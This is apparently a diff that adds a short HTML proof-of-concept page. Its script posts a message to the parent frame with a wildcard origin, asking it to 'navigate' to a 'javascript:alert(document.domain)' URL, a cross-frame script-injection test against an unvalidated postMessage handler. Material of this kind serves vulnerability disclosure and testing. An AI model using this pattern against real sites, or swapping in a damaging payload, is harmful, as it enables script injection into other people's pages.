@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head><title>PoC</title></head>
+<body>
+<script>
+  window.parent.postMessage(
+    JSON.stringify({
+      action: "navigate",
+      payload: { type: "redirect", param: "javascript:alert(document.domain)" }
+    }),
+    "*"
+  );
+</script>
+</body>
+</html>
